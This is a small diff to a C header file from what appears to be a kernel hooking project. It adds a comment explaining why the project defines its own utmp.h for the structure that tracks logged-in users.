@@ -1,6 +1,6 @@
 #ifndef FILE_HACKS_KITE
     #define FILE_HACKS_KITE
-    #include "utmp.h"
+    #include "utmp.h" //utmp.h is not defined in the kernel so we define it on our own, contains the utmp struct to handle logged in users
     #include "kite_hook.h"
     #include "linked_list.h"
 
